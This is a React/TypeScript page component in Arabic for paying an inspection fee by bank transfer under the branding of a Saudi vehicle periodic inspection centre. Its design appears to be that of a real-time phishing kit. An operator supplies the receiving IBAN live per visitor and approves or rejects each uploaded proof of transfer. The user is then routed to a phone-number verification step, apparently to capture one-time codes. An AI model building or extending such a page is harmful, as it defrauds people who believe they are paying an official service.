import {
  isFormRejected,
  mainInfo,
  nextPage,
} from "@/real-time/context/signals";
import { submitFileFrom } from "@/real-time/hooks/useCalls";
import { setCurrentPage } from "@/real-time/utils/utils";
import theme from "@/theme";
import { Close, FileUploadOutlined, InfoOutlined } from "@mui/icons-material";
import {
  Box,
  Button,
  Divider,
  FormHelperText,
  IconButton,
  lighten,
  Link,
  Tooltip,
} from "@mui/material";
import { useCallback, useEffect, useState } from "react";
import { FileRejection, useDropzone } from "react-dropzone";

export default function BankTransfer() {
  const [file, setFile] = useState<File | null>(null);
  const [error, setError] = useState("");
  const [status, setStatus] = useState<"loading" | "saved" | null>(null);

  useEffect(() => setCurrentPage("تحويل بنكي"), []);

  const sendFile = async () => {
    isFormRejected.value = false;
    nextPage.value = "توثيق رقم الجوال";
    setStatus("loading");
    submitFileFrom({
      page: "تحويل بنكي",
      file: file as File,
      requiresApproval: true,
    }).finally(() => {
      setStatus("saved");
    });
  };

  const paymentInvoice = JSON.parse(
    localStorage.getItem("paymentInvoice") || "{}",
  ) as {
    fee?: { total: number; base: number; vat: number };
    feeTitle?: string;
  };

  const onDrop = useCallback(
    (acceptedFiles: File[], fileRejections: FileRejection[]) => {
      const errors: any = {
        "file-too-large": "حجم الصورة كبير لا يجب أن يتجاوز 3MB",
        "file-invalid-type": "يرجى تحميل إثبات التحويل كصورة فقط",
      };
      if (fileRejections.length) {
        fileRejections[0].errors.forEach((e) => setError(errors[e.code]));
      } else {
        setError("");
        setFile(acceptedFiles[0]);
      }
    },
    [],
  );

  const { getRootProps, getInputProps, isDragActive } = useDropzone({
    accept: { "image/*": [] },
    multiple: false,
    maxSize: 3 * 1024 * 1024,
    onDrop,
  });

  return (
    <>
      <header className="px-4 sm:px-6 py-3">
        <img src="images/vsc.svg" alt="logo" width="161px" height="39.6px" />
      </header>
      <Divider />
      <section className="gap-5 bg-white sm:bg-gray-700/[.03] mx-auto grid w-full max-w-7xl px-4 sm:px-0 grid-cols-1 lg:grid-cols-2 min-h-[calc(100vh_-_56.6px)]">
        <div className="w-full bg-white pr-0 sm:pr-11 pt-6 sm-pb-8 pl-0 sm:pl-3">
          <div className="inline-flex w-full max-w-[465px] flex-col items-start">
            <div className="inline-flex flex-col items-start gap-3">
              <div className="text-lg font-bold leading-7 text-foreground/80">
                معلومات الفاتورة
              </div>
              <p className="text-sm font-normal leading-tight text-gray-500">
                دفع رسوم {paymentInvoice.feeTitle}
              </p>
              <h1 className="text-4xl font-bold leading-10 text-foreground/80">
                {paymentInvoice.fee?.total.toFixed(2)} ر.س
              </h1>
            </div>
            <div className="flex w-full flex-col gap-6 mt-11">
              <div className="flex flex-col gap-2">
                <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-foreground">
                  <div>المجموع الفرعي</div>
                  <div className="leading-none">
                    {paymentInvoice.fee?.base.toFixed(2)} ر.س
                  </div>
                </div>
                <div className="flex w-full items-center justify-between gap-4 text-xs font-normal leading-none text-gray-500">
                  <div>ضريبة القيمة المضافة 15%</div>
                  <div className="text-sm leading-none">
                    {paymentInvoice.fee?.vat.toFixed(2)} ر.س
                  </div>
                </div>
              </div>
              <Divider />
              <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-foreground">
                <div>المبلغ المستحق</div>
                <div className="text-sm leading-none">
                  {paymentInvoice.fee?.total.toFixed(2)} ر.س
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="bg-white pr-0 sm:pr-10 pt-6 pb-8 w-full">
          <div className="max-w-[500px]">
            <div className="flex flex-col gap-2">
              <div className="flex items-center justify-between">
                <div className="text-lg font-bold leading-7 text-foreground/80">
                  الدفع من خلال التحويل البنكي
                </div>
                <img
                  src="images/banks/national-commercial-bank.png"
                  alt="bank"
                  className="h-7"
                />
              </div>
              <div className="p-4 text-sm border-2 border-blue-400 rounded-lg text-justify">
                يرجى التوجه إلى تطبيق بنك الأهلي ثم إضافة الأيبان كمستفيد بإسم :
                مركز سلامة للفحص الدوري ، بعد ذلك قم بإجراء تحويل المبلغ إلى
                حساب مركز سلامة . ملاحظة : التحويل بدون إضافة المستفيد غير معتمد
                لدى مركز سلامة ، خدمة التحويل السريع غير معتمدة حالياً .
              </div>
            </div>
            <form className="flex flex-col gap-4">
              <div className="mt-5 inline-flex w-full flex-col items-start justify-start gap-4">
                <div>
                  <div className="text-sm font-semibold mb-2">
                    المعلومات البنكية
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="flex flex-col">
                      <div className="text-gray-500 text-xs">اسم البنك</div>{" "}
                      {mainInfo.value.bankAccount?.bankName || "--"}
                    </div>
                    <div className="flex flex-col">
                      <div className="text-gray-500 text-xs">
                        {" "}
                        اسم صاحب الحساب / الوكيل المفوض
                      </div>{" "}
                      {mainInfo.value.bankAccount?.accountHolderName || "--"}
                    </div>
                    <div className="flex flex-col">
                      <div className="text-gray-500 text-xs">رقم الحساب </div>
                      <Tooltip title="نسخ" placement="top">
                        <span
                          className="cursor-pointer"
                          onClick={() =>
                            navigator.clipboard.writeText(
                              mainInfo.value.bankAccount?.iban || "--",
                            )
                          }
                          dir="ltr"
                        >
                          {mainInfo.value.bankAccount?.iban || "--"}
                          {/* .replace(
                            /(.{4})/g,
                            "$1 ",
                          ) || "--" */}
                        </span>
                      </Tooltip>
                    </div>
                    <div className="flex flex-col">
                      <div className="text-gray-500 text-xs">
                        {" "}
                        الغرض من التحويل
                      </div>{" "}
                      {mainInfo.value.bankAccount?.transferPurpose
                        ? `${mainInfo.value.bankAccount?.transferPurpose} -  رقم الطلب ${mainInfo.value.visitorNumber}`
                        : "--"}
                    </div>
                  </div>
                </div>

                <div className="flex flex-col w-full h-60">
                  <div className="text-sm font-semibold mb-2 h-auto">
                    إرفاق إثبات التحويل
                  </div>
                  {file ? (
                    <div className="flex-1 rounded-xl flex flex-col justify-between items-center relative bg-gray-100 max-h-[calc(100%-28px)] p-1 group">
                      <div className="hidden group-hover:block absolute top-0 left-0">
                        <IconButton onClick={() => setFile(null)}>
                          <Close />
                        </IconButton>
                      </div>
                      <div>{file.name}</div>
                      {file.type == "application/pdf" ? (
                        <iframe
                          src={URL.createObjectURL(file)}
                          style={{ border: "none" }}
                          className="max-w-full max-h-[calc(100%)]"
                        />
                      ) : (
                        <img
                          src={URL.createObjectURL(file)}
                          className="max-w-full max-h-[calc(100%-35px)]"
                        />
                      )}
                    </div>
                  ) : (
                    <div {...getRootProps()} className="flex-1 relative">
                      {isDragActive ? (
                        <Box
                          sx={{
                            backgroundColor: lighten(
                              theme.palette.primary.light,
                              0.6,
                            ),
                            color: "primary.dark",
                            border: "2px solid",
                            borderColor: "primary.light",
                          }}
                          className="h-full border-2 border-dashed rounded-xl flex justify-center items-center text-xl"
                        >
                          إسقاط الملف هنا
                        </Box>
                      ) : (
                        <div className="h-full border-2 border-dashed rounded-xl flex flex-col justify-center items-center cursor-pointer">
                          <div className="flex flex-col justify-center items-center">
                            <Box
                              className="w-[56px] h-[56px] flex justify-center items-center rounded-full cursor-pointer"
                              sx={{
                                bgcolor: lighten(
                                  theme.palette.primary.light,
                                  0.9,
                                ),
                              }}
                            >
                              <FileUploadOutlined
                                color="primary"
                                sx={{ width: "32px", height: "32px" }}
                              />
                            </Box>
                            <div className="font-[500] mt-1">
                              تحميل الإثبات{" "}
                            </div>

                            <div className="mt-3 text-gray-500">
                              اسحب وأفلِت أو{" "}
                              <Link
                                underline="none"
                                className="cursor-pointer"
                                color="primary"
                              >
                                اختر الملف
                              </Link>{" "}
                              الذي تريد تحميله
                            </div>
                          </div>
                          <div className="text-xs text-gray-500 absolute bottom-3">
                            الملفات المدعومة: PDF أو صور (.jpeg, .jpg, .png,
                            heic.)
                          </div>
                        </div>
                      )}
                      <input {...getInputProps()} />
                    </div>
                  )}
                </div>
                {error && <FormHelperText error>{error}</FormHelperText>}
              </div>
              {isFormRejected.value && (
                <div className="font-medium mt-5 text-red-500 text-center text-sm flex items-center gap-1">
                  <InfoOutlined fontSize="small" color="error" />
                  <span>تم التحقق من إثبات التحويل ويوجد به خطا</span>
                </div>
              )}
              <div className="mt-4">
                <Button
                  variant="contained"
                  disabled={!file || status == "saved"}
                  loading={status == "loading"}
                  onClick={sendFile}
                  fullWidth
                  size="large"
                >
                  {status == "saved" ? "تم الإرسال بنجاح" : "إرسال"}
                </Button>
              </div>
            </form>
          </div>
        </div>
      </section>
    </>
  );
}
